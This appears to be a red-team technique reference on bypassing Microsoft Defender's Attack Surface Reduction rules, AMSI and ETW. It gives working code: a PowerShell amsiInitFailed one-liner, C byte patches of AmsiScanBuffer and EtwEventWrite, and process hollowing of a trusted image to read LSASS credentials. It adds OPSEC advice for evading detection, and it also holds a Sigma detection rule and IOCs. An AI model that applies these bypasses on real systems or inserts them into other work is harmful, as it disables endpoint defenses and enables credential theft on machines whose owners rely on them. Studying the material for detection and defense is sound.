# ASR Rule Bypass + AMSI Bypass + ETW Blinding

Cluster on defeating Defender's behavioral/telemetry layer: **Attack Surface Reduction (ASR)**
rules, the **Antimalware Scan Interface (AMSI)**, and **Event Tracing for Windows (ETW)**. These
sit between code execution and detection; blinding them is high-impact but each technique leaves
its own IOC, so they are last-resort, scoped, and reversible where possible.

## ASR Rule Bypass

### Mechanism
ASR rules are behavioral blocks enforced by Defender (`MpEngine`). The flagship is **Block
credential stealing from lsass.exe** (GUID `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0`), which strips
`PROCESS_VM_READ` from handles to LSASS — it filters the handle returned by `OpenProcess` to
remove read access, so a normal dumper can't read LSASS memory. As of 2024 Microsoft moved this
rule to **Block by default**.
```powershell
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
# 1=Block 2=Audit 6=Warn 0/absent=Off
```

### Bypasses
1. **Global exclusion abuse (design flaw).** Defender exclusions are **not rule-specific** — a
   directory excluded for *any* reason is excluded from *all* ASR rules, including the LSASS rule.
   Run the tool from an excluded path. Built-in Defender exclusions also exist (extractable below).
2. **Trusted/excluded-image hollowing.** Defender ships an internal list of "trusted" images that
   the LSASS rule won't block. Create one of those images suspended, hollow it, and run from it.
   ```c
   // create a trusted, ASR-excluded image suspended, then hollow it
   CreateProcessA("C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", NULL, 0,0,FALSE,
                  CREATE_SUSPENDED, 0,0,&si,&pi);
   // NtUnmapViewOfSection original image, map payload, set RIP, ResumeThread
   ```
3. **Extract the exclusion / trusted-process list (so you know what's safe).**
   ```bash
   # Decompress Defender signatures, then locate the ASR rule GUID and the paths after it
   python scripts/extract_asr_exclusions.py \
     --base "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\Backup\mpasbase.vdm"
   # parses the extracted VDM for the LSASS-rule GUID and lists trusted/excluded program paths
   ```
   (Cross-reference HackingLZ/ExtractedDefender for pre-extracted lists.)
4. **Avoid the blocked behavior entirely.** "Block Office child processes" → use COM/WMI instead
   of spawning; "Block creds from LSASS" → use a *trusted* image (above), a driver (BYOVD, see
   ppl-lsa-protection.md), or `MiniDumpWriteDump` from an excluded path. Note: third-party AV
   installed → ASR is disabled outright; full ASR requires Enterprise + Defender as primary AV.

## AMSI Bypass

### Mechanism
AMSI lets script hosts (PowerShell, WScript, VBA, .NET, JScript) submit content to the AV via
`amsi.dll!AmsiScanBuffer` before execution. Defeating it means the AV never sees the script.

### Bypasses (in-process, after you can run *some* code)
1. **`amsiInitFailed` flag (PowerShell).** Forces the runtime to treat AMSI as unavailable:
   ```powershell
   [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')`
     .GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,$true)
   ```
2. **Patch `AmsiScanBuffer` to return clean.** Overwrite the prologue so every scan returns
   `AMSI_RESULT_CLEAN` / `S_OK`:
   ```c
   // mov eax, 0x80070057 (E_INVALIDARG) ; ret  -> scanner short-circuits, content runs
   unsigned char patch[] = {0xB8,0x57,0x00,0x07,0x80,0xC3};
   void* p = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
   DWORD o; VirtualProtect(p, sizeof patch, PAGE_EXECUTE_READWRITE, &o);
   memcpy(p, patch, sizeof patch);
   VirtualProtect(p, sizeof patch, o, &o);   // restore page protection (not bytes)
   ```
3. **Hardware-breakpoint AMSI bypass (no byte patch).** Set a debug-register (DR0–DR3) breakpoint
   on `AmsiScanBuffer`; in the `VEH` handler set `RAX = S_OK` / result clean and `RIP = ret`. Leaves
   `amsi.dll` `.text` byte-for-byte intact, evading memory-integrity scans of the prologue.
4. **Forced error / patch `amsi.dll` provider init** (`AmsiOpenSession`, `DllGetClassObject`).

## ETW Blinding

### Mechanism
ETW carries security-relevant traces (PowerShell ScriptBlock, .NET, AMSI-result, threat-intel
provider). Userland consumers read events via `ntdll!EtwEventWrite`; blinding patches the write
path or disables specific providers.
```c
// Blanket userland blind: ret at the top of EtwEventWrite (and friends)
void PatchETW(void){
    HMODULE n = GetModuleHandleA("ntdll.dll");
    const char* fns[] = {"EtwEventWrite","EtwEventWriteFull","EtwEventWriteTransfer"};
    for (int i=0;i<3;i++){
        BYTE* a = (BYTE*)GetProcAddress(n, fns[i]); DWORD o;
        VirtualProtect(a,1,PAGE_EXECUTE_READWRITE,&o);
        *a = 0xC3;                       // ret
        VirtualProtect(a,1,o,&o);
    }
}
```
**Selective provider disable (quieter than blanket patch):** disable just the providers that
matter, leaving the rest of ETW healthy so the gap is less obvious:
```text
Microsoft-Windows-PowerShell        {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
Microsoft-Windows-DotNETRuntime     {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
Microsoft-Antimalware-Scan-Interface{2A576B87-09A7-520E-C21A-4942F0271D67}
Microsoft-Windows-Threat-Intelligence{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}  ; kernel ETW-TI (PPL/driver)
```
Kernel-level ETW-TI (the sensor EDRs subscribe to) cannot be blinded from userland — that requires
a driver (`NtTraceControl` / kernel patch), see byovd-vbs-hvci.md.

## Detection

```yaml
title: Telemetry Tampering - AMSI/ETW Patch or ASR Trusted-Image Hollow
id: a4f1c0d2-9e3b-4c5a-8f7d-2b1c3d4e5f60
status: experimental
logsource:
  product: windows
  category: process_access          # Sysmon EID 10 / EDR memory telemetry
detection:
  amsi_etw_patch:
    TargetImage|endswith: ['\amsi.dll', '\ntdll.dll']
    # EDR-side: write to .text of these modules, or first byte == 0xC3/0xCC at
    # EtwEventWrite/AmsiScanBuffer
  lsass_access_trusted_proc:
    TargetImage|endswith: '\lsass.exe'
    SourceImage|endswith: ['\WmiPrvSE.exe','\svchost.exe']   # hollowed trusted image
    GrantedAccess|contains: ['0x1010','0x1410','0x1438']
  condition: amsi_etw_patch or lsass_access_trusted_proc
falsepositives: [security products that legitimately hook amsi/ntdll]
level: high
```
IOCs: first byte of `EtwEventWrite`/`AmsiScanBuffer` = `0xC3`/`0xB8`; RWX or recently-modified
`.text` in `amsi.dll`/`ntdll.dll`; sudden silence of PowerShell ScriptBlock (EID 4104) or .NET
ETW; LSASS handle (`0x1010`/`0x1410`) from a process running out of an excluded/oddly-located path;
Defender event 5007 (config/exclusion change) when exclusions are added.

## OPSEC

- AMSI/ETW byte patches are detectable by memory-integrity scanners — prefer **hardware-breakpoint
  AMSI** (no byte edit) and **selective provider disable** over blanket `ret` patches; always
  restore bytes when done.
- Use **indirect syscalls** for the `VirtualProtect`/`memcpy` around patches so the patch step
  itself isn't caught by userland API hooks.
- ASR exclusion abuse: don't *add* exclusions (Defender event 5007 fires) — use ones that already
  exist (extract them) or a trusted image.
- Kernel ETW-TI is the EDR's real eyes and is unreachable from userland; if it's in play, you need
  a driver, which is far louder — weigh whether blinding is worth the BYOVD IOCs.

## References

- Abdullah AlZahrani — *Bypass ASR Rule and Dump LSASS* (global exclusion + extraction): https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/bypass-asr-rule-and-dump-lsass
- HackingLZ — *ExtractedDefender* (pre-extracted ASR exclusion / trusted-process lists): https://github.com/HackingLZ/ExtractedDefender
- BleepingComputer — *Microsoft Defender will soon block Windows password theft* (LSASS ASR default Block, 2024): https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-will-soon-block-windows-password-theft/
- Microsoft Learn — *Attack surface reduction (ASR) rules reference*: https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference
